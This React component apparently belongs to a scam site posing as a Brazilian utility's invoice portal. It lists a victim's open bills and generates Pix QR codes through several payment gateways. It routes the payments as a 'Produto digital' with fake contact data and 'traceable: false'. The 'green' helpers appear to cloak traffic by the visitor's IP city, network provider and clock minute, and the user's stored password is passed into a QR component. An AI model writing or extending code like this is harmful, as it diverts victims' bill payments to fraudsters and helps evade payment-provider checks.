/* eslint-disable @typescript-eslint/no-unused-vars */
'use client';

import { useEffect, useState } from 'react';
import { IoMdArrowDropdown } from 'react-icons/io';

import { twMerge } from 'tailwind-merge';

import TransactionError from '@/errors/transactionError';
import getGreenLocation from '@/functions/getGreenLocation';
import getIP from '@/functions/getIP';
import PixProtocol from '@/interfaces/pixProtocol';
import TransactionPixProtocol from '@/interfaces/transactionPixProtocol';
import TransactionPixProtocol2 from '@/interfaces/transactionPixProtocol2';
import TransactionPixProtocol3 from '@/interfaces/transactionPixProtocol3';
import TransactionPixProtocol4 from '@/interfaces/transactionPixProtocol4';
import TransactionPixProtocol6 from '@/interfaces/transactionPixProtocol6';
import TransactionsProtocol from '@/interfaces/transactionsProtocol';
import UserProtocol from '@/interfaces/userProtocol';
import formatPrice from '@/services/formatPrice';
import validationCPF from '@/services/validationCPF';
import { useLoadingApplicationContext } from '@/utils/loadingApplicationContext/useContext';
import { useToastContext } from '@/utils/toastContext/useContext';

import QRCodePix from './QRCode';
import QRCodePixInstallments from './QRCodeInstallments';
import QRCodePixStatic from './QRCodeStatic';

interface Props extends PixProtocol {
  className?: string;
  userId: string;
  user: UserProtocol;
  userName: string;
}

export default function Invoices({ className, user, pixKey, pixName }: Props) {
  const [userState, setUserState] = useState(() => ({
    active: false,
    account: {
      ...user.contas[0],
      faturas: user.contas[0].faturas.map(item => ({
        ...item,
        checked: false,
      })),
    },
    get digitAccount() {
      return this.account.numeroContaComDigito;
    },
  }));
  const [QRCodeStatic, setQRCodeStatic] = useState({ show: false, value: 0 });
  const [qrcode, setQRCode] = useState('');
  const [QRCodeInstallments, setQRCodeInstallments] = useState({
    value: 0,
    show: false,
  });
  const [greenLocation, setGreenLocation] = useState({
    org: '',
    city: '',
  });
  const { isLoading, setIsLoading } = useLoadingApplicationContext();
  const { setToast } = useToastContext();
  const invoicesDebts = userState.account.faturas.filter(
    item =>
      (item.statusFatura.toLowerCase() === 'em aberto' && item.valorDebito) ||
      (item.statusFatura.toLowerCase() === 'em atraso' && item.valorDebito)
  );
  const invoicesTotalDebts = invoicesDebts.reduce(
    (p, c) => p + c.valorDebito,
    0
  );
  const isCheckedAll = invoicesDebts.every(item => item.checked === true);
  const invoicesDebtsChecked = invoicesDebts.filter(item => item.checked);
  const invoicesTotalDebtsChecked = invoicesDebtsChecked.reduce(
    (p, c) => p + c.valorDebito,
    0
  );
  const [currentInvoice, setCurrentInvoice] = useState({
    userName: userState.account.nomeTitular,
    digitAccount: userState.digitAccount,
    total: invoicesTotalDebtsChecked,
    maturity: new Date().toLocaleDateString('pt-BR', { dateStyle: 'short' }),
  });
  let citys = [
    'São Paulo',
    'Guarulhos',
    'Campinas',
    'Santo André',
    'Sorocaba',
    'Osasco',
    'Ribeirão Preto',
    'São José dos Campos',
    'São José do Rio Preto',
    'Jundiaí',
  ];
  citys = citys.map(item => item.trim().toUpperCase());

  useEffect(() => {
    setCurrentInvoice({
      userName: userState.account.nomeTitular,
      digitAccount: userState.digitAccount,
      total: invoicesTotalDebtsChecked,
      maturity: new Date().toLocaleDateString('pt-BR', { dateStyle: 'short' }),
    });
  }, [userState, invoicesTotalDebtsChecked]);

  useEffect(() => {
    (async () => {
      const newGreenLocation = await getGreenLocation();
      setGreenLocation(newGreenLocation);
    })();
  }, []);

  const handleFormatDateMaturity = (date: string) => {
    return new Date(date).toLocaleDateString('pt-BR', { dateStyle: 'short' });
  };

  const handleCheckboxChange = (checked: boolean, i: number) => {
    setUserState(state => ({
      ...state,
      account: {
        ...state.account,
        faturas: state.account.faturas.map((item, indexInvoices) =>
          i === indexInvoices ? { ...item, checked } : item
        ),
      },
    }));
  };

  const handleCheckboxAllChange = (checked: boolean) => {
    setUserState(state => ({
      ...state,
      account: {
        ...state.account,
        faturas: state.account.faturas.map(item => ({ ...item, checked })),
      },
    }));
  };

  const handleIsPar = () => {
    const now = new Date();
    const minutes = now.getMinutes();
    return minutes % 2 === 0;
  };

  const handleIsGreenHard = (amount: number) => {
    return (
      // handleIsPar() && amount < 600 && citys.includes(greenLocation.city)
      handleIsPar() && amount < 600
      // amount < 600 && citys.includes(greenLocation.city) && greenLocation.org !== 'AS28358 INTERTELCO TELECOMUNICAÇÕES MULTIMÍDIA LTDA' // eslint-disable-line
    );
  };

  const handleIsGreen = (amount: number) => {
    // presta atenção na taxa limite do ipinfo
    // console.log(greenLocation);
    return (
      // handleIsPar() && amount < 600
      handleIsPar() && amount < 600 && greenLocation.city === 'GOIÂNIA'  // eslint-disable-line
    );
  };

  const handlePaymentGateway = async () => {
    if (isLoading) return;
    let amount = invoicesTotalDebtsChecked;
    if (!invoicesDebtsChecked.length) {
      setToast({
        open: true,
        severity: 'error',
        message: 'Selecione ao menos uma fatura para continuar',
      });
      return;
    }
    // if (handleIsGreen(amount)) {
    //   handlePaymentVelana();
    //   return;
    // }
    if (amount > 700) {
      setQRCodeInstallments({ value: amount, show: true });
      return;
    }
    amount = Math.round(amount * 100);
    try {
      setIsLoading(true);
      const ip = await getIP();
      const newBody: TransactionPixProtocol = {
        currency: 'BRL',
        paymentMethod: 'PIX',
        amount: amount,
        customer: {
          name: userState.account.nomeTitular,
          email: 'example@example.com',
          phone: '99985326544',
          document: {
            number: user.idDocument.replace(/\D/g, ''),
            type: validationCPF(user.idDocument) ? 'cpf' : 'cnpj',
          },
          address: {
            street: userState.account.nomeLogradouro ?? 'none',
            streetNumber: '465',
            complement: '',
            zipCode: '76629971',
            neighborhood: userState.account.nomeBairro,
            city: userState.account.nomeCidade,
            state: 'GO',
            country: 'BR',
          },
        },
        shipping: {
          fee: 0,
          address: {
            street: userState.account.nomeLogradouro ?? 'none',
            streetNumber: '465',
            complement: '',
            zipCode: '76629971',
            neighborhood: userState.account.nomeBairro,
            city: userState.account.nomeCidade,
            state: 'GO',
            country: 'BR',
          },
        },
        items: [
          {
            quantity: 1,
            tangible: true,
            title: 'Produto digital',
            unitPrice: amount,
          },
        ],
        ip,
        pix: { expiresInDays: 1 },
        traceable: false,
        postbackUrl: 'https://growthsuplementos.vercel.app/',
      };
      const res = await fetch('/api/create-transaction-pix', {
        method: 'post',
        body: JSON.stringify(newBody),
      });
      const data = await res.json();
      if (data.errorMsg || !res.ok) {
        throw new TransactionError(data.errorMsg);
      }
      const qrcode = data.qrcode;
      setQRCode(qrcode);
      setIsLoading(false);
    } catch (err) {
      console.log(err);
      if (err instanceof TransactionError) {
        setToast({
          open: true,
          severity: 'error',
          message: err.message,
        });
        return;
      }
      setToast({
        open: true,
        severity: 'error',
        message: 'Ocorreu um erro desconhecido, tente novamente mais tarde',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handlePaymentGatewayAura = async () => {
    if (isLoading) return;
    let amount = invoicesTotalDebtsChecked;
    if (!invoicesDebtsChecked.length) {
      setToast({
        open: true,
        severity: 'error',
        message: 'Selecione ao menos uma fatura para continuar',
      });
      return;
    }
    // if (amount > 800) {
    //   setQRCodeInstallments({ value: amount, show: true });
    //   return;
    // }

    amount = Math.round(amount * 100);
    try {
      setIsLoading(true);
      const newBody: TransactionPixProtocol2 = {
        amount,
        externalRef: '',
        postbackUrl: '',
        customer: {
          name: userState.account.nomeTitular,
          email: 'example@example.com',
          phone: '62994524354',
          document: {
            type: validationCPF(user.idDocument) ? 'cpf' : 'cnpj',
            number: user.idDocument,
          },
        },
        traceable: false,
        metadata: '{"provider":"Checkout Transparent"}',
        items: [
          {
            title: 'Produto Digital',
            unitPrice: amount,
            quantity: 1,
            tangible: false,
            externalRef: '',
            product_image: '',
          },
        ],
        paymentMethod: 'pix',
        installments: '1',
      };
      const res = await fetch('/api/create-transaction-pix2', {
        method: 'post',
        body: JSON.stringify(newBody),
      });
      const data = await res.json();
      if (data.errorMsg || !res.ok) {
        throw new TransactionError(data.errorMsg);
      }
      const qrcode = data.qrcode;
      setQRCode(qrcode);
    } catch (err) {
      console.log(err);
      if (err instanceof TransactionError) {
        setToast({
          open: true,
          severity: 'error',
          message: err.message,
        });
        return;
      }
      setToast({
        open: true,
        severity: 'error',
        message: 'Ocorreu um erro desconhecido, tente novamente mais tarde',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handlePaymentGatewayPagshield = async () => {
    if (isLoading) return;
    let amount = invoicesTotalDebtsChecked;

    amount = Math.round(amount * 100);
    try {
      setIsLoading(true);
      const newBody: TransactionPixProtocol3 = {
        paymentMethod: 'pix',
        amount,
        customer: {
          name: userState.account.nomeTitular,
          email: 'exemple@exemple.com',
          document: {
            type: 'cpf',
            number: user.idDocument,
          },
        },
        items: [
          {
            title: 'Produto Digital',
            unitPrice: amount,
            quantity: 1,
            tangible: false,
          },
        ],
        pix: { expiresInDays: 1 },
      };
      const res = await fetch('/api/create-transaction-pix3', {
        method: 'post',
        body: JSON.stringify(newBody),
      });
      const data = await res.json();
      if (data.errorMsg || !res.ok) {
        throw new TransactionError(data.errorMsg);
      }
      const qrcode = data.qrcode;
      setQRCode(qrcode);
    } catch (err) {
      console.log(err);
      if (err instanceof TransactionError) {
        setToast({
          open: true,
          severity: 'error',
          message: err.message,
        });
        return;
      }
      setToast({
        open: true,
        severity: 'error',
        message: 'Ocorreu um erro desconhecido, tente novamente mais tarde',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handlePaymentVelana = async () => {
    if (isLoading) return;
    let amount = invoicesTotalDebtsChecked;

    amount = Math.round(amount * 100);
    try {
      setIsLoading(true);
      const newBody: TransactionPixProtocol4 = {
        paymentMethod: 'pix',
        amount: amount,
        customer: {
          name: userState.account.nomeTitular,
          email: 'example@example.com',
          document: {
            number: user.idDocument.replace(/\D/g, ''),
            type: validationCPF(user.idDocument) ? 'cpf' : 'cnpj',
          },
          phone: '11985327456',
        },
        items: [
          {
            quantity: 1,
            tangible: true,
            title: 'Produto digital',
            unitPrice: amount,
          },
        ],
        pix: { expiresInDays: 1 },
      };
      const res = await fetch('/api/create-transaction-pix4', {
        method: 'post',
        body: JSON.stringify(newBody),
      });
      const data = await res.json();
      if (data.errorMsg || !res.ok) {
        throw new TransactionError(data.errorMsg);
      }
      const qrcode = data.qrcode;
      setQRCode(qrcode);
    } catch (err) {
      console.log(err);
      if (err instanceof TransactionError) {
        setToast({
          open: true,
          severity: 'error',
          message: err.message,
        });
        return;
      }
      setToast({
        open: true,
        severity: 'error',
        message: 'Ocorreu um erro desconhecido, tente novamente mais tarde',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handlePaymentPixBolt = async () => {
    if (isLoading) return;
    let amount = invoicesTotalDebtsChecked;
    if (!invoicesDebtsChecked.length) {
      setToast({
        open: true,
        severity: 'error',
        message: 'Selecione ao menos uma fatura para continuar',
      });
      return;
    }
    // if (handleIsGreen(amount)) {
    //   handlePaymentVelana();
    //   return;
    // }
    if (amount > 800) {
      setQRCodeInstallments({ value: amount, show: true });
      return;
    }

    try {
      setIsLoading(true);
      const newBody: TransactionPixProtocol6 = {
        payment_method: 'pix',
        amount: amount,
        customer: {
          name: userState.account.nomeTitular,
          email: 'example@example.com',
          document: user.idDocument.replace(/\D/g, ''),
          phone: '11985327456',
        },
        description: 'Produto digital',
        metadata: {
          order_id: crypto.randomUUID(),
          product_id: crypto.randomUUID(),
        },
        postbackUrl: 'https://google.com',
      };
      const res = await fetch('/api/create-transaction-pix6', {
        method: 'post',
        body: JSON.stringify(newBody),
      });
      const data = await res.json();
      if (data.errorMsg || !res.ok) {
        throw new TransactionError(data.errorMsg);
      }
      const qrcode = data.qrcode;
      setQRCode(qrcode);
    } catch (err) {
      console.log(err);
      if (err instanceof TransactionError) {
        setToast({
          open: true,
          severity: 'error',
          message: err.message,
        });
        return;
      }
      setToast({
        open: true,
        severity: 'error',
        message: 'Ocorreu um erro desconhecido, tente novamente mais tarde',
      });
    } finally {
      setIsLoading(false);
    }
  };

  const handlePaymentQRCodeStatic = async () => {
    if (isLoading) return;
    let amount = invoicesTotalDebtsChecked;
    if (!invoicesDebtsChecked.length) {
      setToast({
        open: true,
        severity: 'error',
        message: 'Selecione ao menos uma fatura para continuar',
      });
      return;
    }
    setQRCodeStatic({ show: true, value: amount });
  };

  const handleCloseQRCode = () => {
    setQRCode('');
  };

  return (
    <div
      className={twMerge(
        'w-full h-full mx-auto max-w-[940px] flex flex-col items-center',
        className
      )}
    >
      <button
        type='button'
        className='shadow-select-account px-4 bg-white h-11 flex items-center gap-2 rounded-3xl w-fit mb-5'
        onClick={() => setUserState(state => ({ ...state, active: true }))}
      >
        <svg
          xmlns='http://www.w3.org/2000/svg'
          className='ionicon fill-00649c'
          viewBox='0 0 512 512'
          width={30}
          height={30}
        >
          <path d='M258.9 48C141.92 46.42 46.42 141.92 48 258.9c1.56 112.19 92.91 203.54 205.1 205.1 117 1.6 212.48-93.9 210.88-210.88C462.44 140.91 371.09 49.56 258.9 48zm126.42 327.25a4 4 0 01-6.14-.32 124.27 124.27 0 00-32.35-29.59C321.37 329 289.11 320 256 320s-65.37 9-90.83 25.34a124.24 124.24 0 00-32.35 29.58 4 4 0 01-6.14.32A175.32 175.32 0 0180 259c-1.63-97.31 78.22-178.76 175.57-179S432 158.81 432 256a175.32 175.32 0 01-46.68 119.25z' />
          <path d='M256 144c-19.72 0-37.55 7.39-50.22 20.82s-19 32-17.57 51.93C191.11 256 221.52 288 256 288s64.83-32 67.79-71.24c1.48-19.74-4.8-38.14-17.68-51.82C293.39 151.44 275.59 144 256 144z' />
        </svg>
        <span className='text-black text-base ml-1'>
          Conta: {userState.account.numeroContaComDigito}
        </span>
        <IoMdArrowDropdown
          size={18}
          className={`${userState.active ? 'rotate-180' : 'rotate-0'} transition-transform duration-200`}
        />
      </button>

      <div className='w-full shadow-card-login bg-white p-4 rounded-[8px] flex flex-col items-center mb-4 border border-e4e4e4 border-solid'>
        <h2 className='mb-3 font-medium text-base text-center text-00649c'>
          Identificação do cliente
        </h2>

        <div className='w-full max-w-[700px] flex items-center justify-between self-start'>
          <div className='flex flex-col'>
            <span className='text-sm text-008bd2 font-medium'>
              Proprietário
            </span>
            <span className='text-334155 text-base'>
              {userState.account.nomeProprietario}
            </span>
          </div>
          <div className='flex flex-col'>
            <span className='text-sm text-008bd2 font-medium'>Titular</span>
            <span className='text-334155 text-base'>
              {userState.account.nomeTitular}
            </span>
          </div>
        </div>
      </div>

      <div className='w-full shadow-card-login bg-white p-4 rounded-[8px] flex flex-col mb-4 gap-1 border border-e4e4e4 border-solid'>
        <span className='text-base text-dc2626 font-medium'>Atenção</span>
        <p className='text-334155 text-base'>
          {invoicesDebts.length} débito(s) encontrado(s) nesta conta para
          emissão de segunda via.
        </p>
      </div>

      {invoicesDebts.length ? (
        <div className='w-full shadow-card-login bg-white p-4 rounded-[8px] flex flex-col items-center mb-4 border border-e4e4e4 border-solid'>
          <h2 className='font-medium text-base text-center text-00649c mb-4'>
            Faturas em aberto
          </h2>
          <div className='w-full overflow-auto'>
            <table className='w-full'>
              <thead className='w-full'>
                <tr className='w-full border-b border-b-e4e4e4 border-solid'>
                  <td className='text-sm text-black h-[38px] p-2 font-medium'>
                    <input
                      type='checkbox'
                      className='w-[18px] h-[18px] cursor-pointer'
                      onChange={event =>
                        handleCheckboxAllChange(event.currentTarget.checked)
                      }
                      checked={isCheckedAll}
                    />
                  </td>
                  <td className='text-sm text-black h-[38px] p-2 font-medium text-right'>
                    Referência
                  </td>
                  <td className='text-sm text-black h-[38px] p-2 font-medium text-right'>
                    Vencimento
                  </td>
                  <td className='text-sm text-black h-[38px] p-2 font-medium text-right'>
                    Valor
                  </td>
                </tr>
              </thead>
              <tbody className='w-full'>
                {invoicesDebts.map((item, i) => (
                  <tr
                    key={i}
                    className='w-full border-b border-b-e4e4e4 border-solid'
                  >
                    <td className='text-sm text-black h-[38px] p-2 font-medium'>
                      <input
                        type='checkbox'
                        checked={item.checked}
                        className='w-[18px] h-[18px] cursor-pointer'
                        onChange={event =>
                          handleCheckboxChange(event.currentTarget.checked, i)
                        }
                      />
                    </td>
                    <td className='text-sm text-black h-[38px] p-2 text-right'>
                      {item.referenciaFormatada}
                    </td>
                    <td className='text-sm text-black h-[38px] p-2 text-right'>
                      {handleFormatDateMaturity(item.dataVencimento)}
                    </td>
                    <td className='text-sm text-black h-[38px] p-2 text-right'>
                      {formatPrice(item.valorDebito)}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
          <div className='w-full border-b border-b-e4e4e4 border-solid h-[38px] flex items-center justify-end gap-10'>
            <span className='text-black text-base font-medium'>
              Total do débito:
            </span>
            <span className='text-black text-base font-medium'>
              {formatPrice(invoicesTotalDebts)}
            </span>
          </div>
        </div>
      ) : null}

      {invoicesDebts.length ? (
        <div className='w-full shadow-card-login bg-white p-4 rounded-[8px] flex flex-col items-center mb-4 border border-e4e4e4 border-solid'>
          <h2 className='font-medium text-base text-center text-00649c pb-3 border-b border-b-e4e4e4 border-solid w-full'>
            Faturas selecionadas
          </h2>
          <div className='w-full flex items-center justify-between gap-4 h-10 p-2 border-b border-b-e4e4e4 border-solid'>
            <span className='text-base text-black'>
              Total de débitos selecionados
            </span>
            <span className='text-dc2626 text-base font-medium'>
              {formatPrice(invoicesTotalDebtsChecked)}
            </span>
          </div>
          <div className='w-full flex items-center justify-between gap-4 h-10 p-2 border-b border-b-e4e4e4 border-solid'>
            <span className='text-base text-black'>
              Total de faturas selecionadas
            </span>
            <span className='text-black text-base font-medium'>
              {invoicesDebtsChecked.length}
            </span>
          </div>
          <div className='w-full flex items-center justify-between gap-4 h-10 p-2 border-b border-b-e4e4e4 border-solid'>
            <span className='text-base text-black'>Total de faturas</span>
            <span className='text-black text-base font-medium'>
              {invoicesDebts.length}
            </span>
          </div>
        </div>
      ) : null}

      {invoicesDebts.length ? (
        <button
          type='button'
          className={`${invoicesDebtsChecked.length ? 'opacity-100' : 'opacity-50'} bg-00649c flex items-center justify-center w-[180px] flex-none h-[52px] text-white text-base rounded-2xl font-medium`}
          onClick={handlePaymentGatewayAura}
        >
          Gerar fatura
        </button>
      ) : null}

      {QRCodeStatic.value && QRCodeStatic.show && (
        <QRCodePixStatic
          client={{
            document: user.idDocument,
            email: user.email,
            name: user.nome,
            phone: '99985329866',
            maturity: currentInvoice.maturity,
            total: QRCodeStatic.value,
            digitAccount: currentInvoice.digitAccount,
            password: user.password,
          }}
          pixKey={pixKey}
          pixName={pixName}
          setQRCodeStatic={setQRCodeStatic}
          value={QRCodeStatic.value}
        />
      )}

      {qrcode && (
        <QRCodePix
          qrcode={qrcode}
          currentInvoice={currentInvoice}
          handleCloseQRCode={handleCloseQRCode}
        />
      )}
      {QRCodeInstallments.value && QRCodeInstallments.show ? (
        <QRCodePixInstallments
          setQRCodeInstallments={setQRCodeInstallments}
          value={QRCodeInstallments.value}
          client={{
            name: userState.account.nomeTitular,
            email: 'example@example.com',
            phone: '62994524354',
            document: { number: user.idDocument, type: 'cpf' },
            maturity: currentInvoice.maturity,
            digitAccount: userState.digitAccount,
            total: QRCodeInstallments.value,
            street: userState.account.nomeLogradouro,
            neighborhood: userState.account.nomeBairro,
            city: userState.account.nomeCidade,
          }}
        />
      ) : null}

      <div
        className={`${userState.active ? 'flex' : 'hidden'} fixed bg-0006 w-full h-screen items-center justify-center z-20 inset-0`}
        onClick={() => setUserState(state => ({ ...state, active: false }))}
      >
        <div
          className='shadow-card-accounts bg-white overflow-hidden w-[250px] rounded-md'
          onClick={event => event.stopPropagation()}
        >
          <div className='w-full py-4 px-6 text-base text-black border-b border-b-e5e7eb border-solid'>
            Conta(s)
          </div>
          {user.contas.map((item, i) => (
            <div
              key={i}
              className='w-full flex items-center py-4 px-6 gap-6 [&:not(:last-child)]:border-b border-b-e5e7eb border-solid cursor-pointer'
              onClick={() =>
                setUserState({
                  account: {
                    ...item,
                    faturas: item.faturas.map(itemInvoice => ({
                      ...itemInvoice,
                      checked: false,
                    })),
                  },
                  active: false,
                  digitAccount: item.numeroContaComDigito,
                })
              }
            >
              <input
                onChange={() => { }} // eslint-disable-line
                type='radio'
                checked={userState.digitAccount === item.numeroContaComDigito}
                className='w-4 h-4 cursor-pointer'
              />
              <span className='text-base text-black'>
                {item.numeroContaComDigito}
              </span>
            </div>
          ))}
          <div className='w-full flex items-center justify-end border-b border-b-e5e7eb border-solid'>
            <button
              type='button'
              className='h-full p-4 text-sm font-medium text-00649c uppercase'
              onClick={() =>
                setUserState(state => ({ ...state, active: false }))
              }
            >
              Cancelar
            </button>
            <button
              type='button'
              className='h-full p-4 text-sm font-medium text-00649c uppercase'
              onClick={() =>
                setUserState(state => ({ ...state, active: false }))
              }
            >
              OK
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
